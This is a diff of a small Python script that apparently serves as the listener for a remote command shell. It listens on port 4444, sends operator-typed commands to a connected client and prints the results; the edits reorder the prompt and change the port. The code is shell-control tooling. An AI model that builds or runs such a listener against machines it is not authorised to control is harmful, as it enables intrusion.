@@ -14,10 +14,11 @@ def server(port: int = 4444):
     print(f'[+] Connection from {addr[0]}:{addr[1]}')
     
     # send shell prompt
+    conn.send('Enter Command '.encode())
+
     while True:
         try:
-            #conn.send(str(input('SHELL-> ')).encode())
-            conn.send('Enter Command '.encode())
+            conn.send(str(input('SHELL-> ')).encode())
 
             result = conn.recv(2048).decode()
             # exit conditions
@@ -32,4 +33,4 @@ def server(port: int = 4444):
             print(f'[-] Exit...')
             sys.exit(-1)
 
-server(4455)
+server(4444)
